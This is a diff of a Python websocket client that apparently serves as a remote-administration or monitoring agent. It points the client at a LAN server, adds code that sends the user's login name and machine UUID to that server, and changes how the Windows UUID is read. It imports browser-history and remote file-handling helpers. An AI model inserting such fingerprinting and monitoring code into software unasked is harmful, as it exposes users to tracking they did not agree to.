@@ -11,7 +11,7 @@ import subprocess
 import time
 
 from browser.monitor_website import fetch_hist
-from utils import handle_cd, download_file, maintain_client_status, modify_result, handle_ls
+from utils import handle_cd, download_file, handle_ls
 
 operating_system = platform.system().lower()
 
@@ -19,12 +19,21 @@ operating_system = platform.system().lower()
 async def start_client():
     ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ssl_context.load_verify_locations(cafile='./server.crt')
-    uri = "wss://127.0.0.1:8000/ws/client"
+    uri = "wss://192.168.1.114:8000/ws/client"
 
     while True:
         try:
             async with websockets.connect(uri, ssl=ssl_context) as websocket:
                 active = 0
+
+                # get client details for admin.
+                await websocket.send(".%.")
+                time.sleep(0.001)
+                username = os.getlogin()
+                system_uuid = get_system_uuid()
+                response = {"username": username, "system_uuid": system_uuid}
+                await websocket.send(json.dumps(response))
+
                 while True:
                     print("Active status: ", active)
                     try:
@@ -116,10 +125,17 @@ def get_system_uuid():
             return None
 
     elif operating_system == 'windows':
-        result = subprocess.run(
-            ['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'],
-            capture_output=True, text=True)
-        return result.stdout.strip().split()[-1].strip()
+        # result = subprocess.run(
+        #     ['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'],
+        #     capture_output=True, text=True)
+        # return result.stdout.strip().split()[-1].strip()
+        try:
+            result = subprocess.run(["wmic", "csproduct", "get", "UUID"], capture_output=True, text=True)
+            output = result.stdout.strip().split("\n")[-1].strip()
+            return output
+        except subprocess.CalledProcessError as e:
+            print(e)
+            return None
 
     return None
 
